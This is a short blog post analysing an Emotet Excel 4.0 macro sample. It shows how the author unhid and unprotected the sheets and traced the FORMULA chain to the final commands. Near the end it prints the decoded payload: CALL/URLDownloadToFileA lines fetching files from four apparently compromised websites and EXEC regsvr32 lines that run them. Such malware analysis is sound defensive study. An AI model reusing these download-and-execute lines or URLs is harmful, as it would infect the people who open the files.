---
layout: post
title: EMOTET XLS MACRO
---

##Sample: SHA256 2b9e253192c68bc69638043a5901d7753a9985a431738f0b22c7efea3e24bdea##
##Sample Link: https://bazaar.abuse.ch/download/2b9e253192c68bc69638043a5901d7753a9985a431738f0b22c7efea3e24bdea/ ##

After looking at John Hammonds video(https://www.youtube.com/watch?v=m6LXnM9mjrU) I decided to take a quick look and try to reconstruct the macro.

First thing I followed the same steps as the video to unhide the sheets and unprotect them. 
We need to unprotect them so that we can change the font color and modify the cells

I followed this article to brute force the password:
https://www.excelsupersite.com/how-to-unprotect-an-excel-spreadsheet-if-you-have-lost-your-password/

The general idea is to run a script on the sheet to unprotect them so that we can modify and change color of hidden text.

![image](https://user-images.githubusercontent.com/107503502/200201163-f428460f-c093-4249-b509-92511b596380.png)

The sheet is now unprotected.
I repeated this for all the sheets.

So we now have 6 sheets with some strings that are not obfuscated and actually start to make out what is goind to happen

![image](https://user-images.githubusercontent.com/107503502/200201177-95cbb78a-12c9-48a1-99e5-4a6db6a8010a.png)

Next step is to identify the entry point. Sheet 6 was unprotected so I'll start from there and check the Auto_Open macro.


![image](https://user-images.githubusercontent.com/107503502/200201206-7a2ce8b6-667c-4d67-860e-89b12bbbcfaf.png)

As you can see from the screenshot, the macro starts from the blank cell in G ( which by the way was hidden at the start, the column was shortened, so at a first glance there was a missing column)
The macro will go top-down jumping all the whitespace.

The first macro we get as seen above is:

=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!F26&Sheet3!R13&Sheet5!E9&Sheet3!M26,G16)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!P21&Sheet3!L8&Sheet5!E9&Sheet1!F24&Sheet1!L31,G18)=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!G28&Sheet3!R13&Sheet5!G15&Sheet3!M26,G20)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!P21&Sheet3!L8&Sheet5!G15&Sheet1!F24&Sheet1!L31,G22)=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!I27&Sheet3!R13&Sheet5!J3&Sheet3!M26,G24)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!P21&Sheet3!L8&Sheet5!J3&Sheet1!F24&Sheet1!L31,G26)=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!J29&Sheet3!R13&Sheet5!L12&Sheet3!M26,G28)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!P21&Sheet3!L8&Sheet5!L12&Sheet1!F24&Sheet1!L31,G30)=FORMULA(Sheet1!L24&Sheet1!G44&Sheet1!H46&Sheet1!J44,G36)

The macro contains =FORMULA() this will retrieve a given formula present in the cells and save it in the cell that is the last argument.

For example the first row will retrieve data from the Sheet1  from L24 L26 L27 L28 L28  Sheet2 F6 N19 F10 R3 SHEET5 Q12 SHEET2 F26 SHEET3 R13 SHEET5 E9 SHEET3 M26  and save it all in G16. We can see that clicking on the cell excel highlights the destination cells.
![image](https://user-images.githubusercontent.com/107503502/200201235-18eb49b0-81d5-4cf7-8c81-ba299686cf9f.png)


So, I inserted =HALT() function in the row below, so that the magic goes on and we see all the functions and calls that will be called.

![image](https://user-images.githubusercontent.com/107503502/200201254-d8a2abe3-493c-4fa7-a750-9ae91e5c666a.png)

=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://audioselec.com/about/dDw5ggtyMojggTqhc/","..\oxnv1.ooccxx",0,0)
=EXEC("C:\Windows\System32\regsvr32.exe ..\oxnv1.ooccxx")
=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://geringer-muehle.de/wp-admin/G/","..\oxnv2.ooccxx",0,0)
=EXEC("C:\Windows\System32\regsvr32.exe ..\oxnv2.ooccxx")
=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://intolove.co.uk/wp-admin/FbGhiWtrEzrQ/","..\oxnv3.ooccxx",0,0)
=EXEC("C:\Windows\System32\regsvr32.exe ..\oxnv3.ooccxx")
=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://isc.net.ua/themes/3rU/","..\oxnv4.ooccxx",0,0)
=EXEC("C:\Windows\System32\regsvr32.exe ..\oxnv4.ooccxx")
=RETURN()

And thats it. this is how i gathered easily the exact commands that will be launched using excel macros.
Nothing was obfuscated so, I guess nothing to interesting happens. But I just had fun doing it and learning a bit about macros in excel.




